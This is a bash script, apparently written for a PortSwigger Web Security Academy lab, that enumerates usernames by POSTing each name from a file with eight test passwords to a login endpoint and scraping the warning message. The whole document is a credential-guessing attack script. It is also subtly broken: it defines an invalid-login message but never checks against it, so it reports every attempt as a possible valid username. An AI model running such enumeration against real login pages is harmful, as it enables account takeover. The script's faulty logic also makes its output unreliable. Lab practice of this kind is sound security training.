#!/usr/bin/env bash

HOST="0a53006804f4f6f0827b02320074005f.web-security-academy.net"
INVALID_USER_MSG="Invalid username or password."

PASS=("test0" "test1" "test2" "test3" "test4" "test5" "test6" "test7")

while IFS= read -r username; do
  for password in "${PASS[@]}"; do
    msg=$(
      curl -s -X POST "https://$HOST/login" \
        --data-urlencode "username=$username" \
        --data-urlencode "password=$password" \
        | grep -oP '<p class=is-warning>\K.*(?=</p>)'
    )

      echo "[+] Possible valid username found: $username"
      echo "[+] Password tried: $password"
      echo "[+] Response: '$msg'"
  done
done < user_list.txt
